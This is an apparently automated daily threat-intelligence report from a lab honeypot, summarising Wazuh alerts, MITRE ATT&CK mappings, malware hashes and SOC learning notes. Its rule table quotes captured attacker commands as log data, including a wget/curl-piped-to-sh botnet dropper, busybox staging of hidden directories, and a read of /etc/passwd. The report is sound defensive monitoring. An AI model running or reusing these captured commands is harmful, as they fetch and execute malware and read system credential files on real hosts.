# LearningLab01 Daily Threat Intelligence Report — 2026-09-12

Generated: 2026-09-12T13:15:05.047Z

Report window: 2026-09-11T13:15:05.026Z through 2026-09-12T13:15:05.026Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 81,368 |
| Attack-related alerts | 15,635 |
| Honeypot interactions | 78,367 |
| Authentication failures | 891 |
| Authentication successes | 374 |
| Critical alerts | 9 |
| High alerts | 184 |
| T-Pot artifacts observed | 6 |
| Malicious artifact detections | 6 |

### Notable Observations

- 9 critical-severity alerts require priority review.
- 184 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 2.38:1.
- Country attribution currently covers only 7.26% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (26,193 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 9 | 0.01% |
| High | 184 | 0.23% |
| Medium | 878 | 1.08% |
| Low | 80,297 | 98.68% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 891
- Authentication successes: 374
- Failure-to-success ratio: 2.38:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 13,291 | 85.01% |
| Payload delivery | 13,291 | 85.01% |
| Authentication failure | 891 | 5.70% |
| Web attack | 773 | 4.94% |
| Reconnaissance | 322 | 2.06% |
| Command execution | 198 | 1.27% |
| SMTP attack | 104 | 0.67% |
| Network scan | 49 | 0.31% |
| Malware | 30 | 0.19% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,905 alerts, representing 7.26% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 75,463 | 92.74% | Not geolocated |
| New Zealand | 2,858 | 3.51% | ████████████████████ |
| United States | 2,734 | 3.36% | ███████████████████ |
| United Kingdom | 198 | 0.24% | █ |
| Hungary | 73 | 0.09% | █ |
| Australia | 20 | 0.02% | █ |
| Romania | 5 | 0.01% | █ |
| China | 3 | 0.00% | █ |
| Iran | 3 | 0.00% | █ |
| Bulgaria | 2 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Poland | 2 | 0.00% | █ |
| South Africa | 2 | 0.00% | █ |
| Turkey | 2 | 0.00% | █ |
| Germany | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 315 |
| Defense Evasion | 314 |
| Privilege Escalation | 313 |
| Persistence | 309 |
| Lateral Movement | 104 |
| Credential Access | 24 |
| Execution | 20 |
| Impact | 11 |
| Command and Control | 9 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 309 |
| Remote Services | 104 |
| Brute Force | 24 |
| Command and Scripting Interpreter | 20 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 9 |
| Exploit Public-Facing Application | 6 |
| Sudo and Sudo Caching | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 26,193 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (26,193) |
| 110205 | 6 | 13,222 | T-Pot Honeytrap received a payload from [IP address] | tpot (13,222) |
| 110204 | 4 | 12,132 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (12,132) |
| 110207 | 5 | 12,120 | T-Pot SentryPeer SIP activity from [IP address]:63800, method INVITE | tpot (12,120) |
| 110213 | 4 | 7,071 | T-Pot RDP connection from [IP address] to port 3389. | tpot (7,071) |
| 110219 | 4 | 5,710 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (5,710) |
| 110101 | 3 | 994 | Cowrie SSH connection from [IP address]. | tpot (994) |
| 110102 | 5 | 891 | Cowrie failed login from [IP address] using username admin. | tpot (891) |
| 110223 | 5 | 761 | T-Pot HoneyAML received GET request from [IP address] to /fetch on port 3000. | tpot (761) |
| 110201 | 4 | 417 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (417) |
| 533 | 7 | 242 | Listened ports status (netstat) changed (new port opened or closed). | tpot (241), wazuh (1) |
| 110216 | 4 | 228 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (228) |
| 5501 | 3 | 205 | PAM: Login session opened. | tpot (199), wazuh (6) |
| 5502 | 3 | 188 | PAM: Login session closed. | tpot (180), wazuh (8) |
| 110104 | 7 | 178 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (178) |
| 110221 | 7 | 136 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (136) |
| 110217 | 7 | 104 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (104) |
| 5715 | 3 | 104 | sshd: authentication success. | tpot (103), wazuh (1) |
| 110212 | 10 | 69 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (69) |
| 110103 | 10 | 65 | Cowrie accepted login from [IP address] using username zalee	. | tpot (65) |
| 110220 | 8 | 58 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (58) |
| 110214 | 9 | 48 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (48) |
| 110215 | 4 | 45 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (45) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110208 | 7 | 28 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:30761 | tpot (28) |
| 110106 | 10 | 24 | Cowrie detected repeated failed logins from [IP address]. | tpot (24) |
| 110108 | 12 | 14 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x42\x4e\x57\x45' | tpot (14) |
| 110224 | 7 | 12 | T-Pot HoneyAML received an HTTP POST from [IP address] to /fetch. | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110105 | 12 | 7 | Cowrie captured a file download from [IP address]. | tpot (7) |
| 110225 | 13 | 6 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (6) |
| 202 | 7 | 6 | Agent event queue is 90% full. | tpot (6) |
| 203 | 9 | 6 | Agent event queue is full. Events may be lost. | tpot (6) |
| 205 | 3 | 6 | Agent event queue is back to normal load. | tpot (6) |
| 5402 | 3 | 4 | Successful sudo to ROOT executed. | wazuh (4) |
| 110107 | 12 | 3 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (3) |
| 110109 | 13 | 3 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cat /etc/passwd | tpot (3) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 110226 | 10 | 2 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 110211 | 9 | 1 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (1) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 6
- Known hashes: 6
- Uploaded or analyzed: 0
- Malicious detections: 6
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| 73695282607747038a31f516e3f8310a67ae6f2f9e4a0b90b55a40f77272e559 | 121256 | known | 42 | 0 | 22 | [Open](https://www.virustotal.com/gui/file/73695282607747038a31f516e3f8310a67ae6f2f9e4a0b90b55a40f77272e559) |
| 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 | 130430 | known | 41 | 0 | 23 | [Open](https://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656) |
| cd9655a77201f73e69953ec5b53f898de41983c1b4dcedd0c431955b9c20b241 | 113710 | known | 41 | 0 | 22 | [Open](https://www.virustotal.com/gui/file/cd9655a77201f73e69953ec5b53f898de41983c1b4dcedd0c431955b9c20b241) |
| 7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8 | 6734 | known | 41 | 0 | 20 | [Open](https://www.virustotal.com/gui/file/7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8) |
| 718ef7418c3114a560c8d7a6c09691ead65ce59ac28bf80708f440311564807d | 173159 | known | 39 | 0 | 25 | [Open](https://www.virustotal.com/gui/file/718ef7418c3114a560c8d7a6c09691ead65ce59ac28bf80708f440311564807d) |
| b14212857fe74349571dc653447dd59ff5938a768a65f90a3d4d653b669f8c83 | 13303808 | known | 38 | 0 | 24 | [Open](https://www.virustotal.com/gui/file/b14212857fe74349571dc653447dd59ff5938a768a65f90a3d4d653b669f8c83) |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
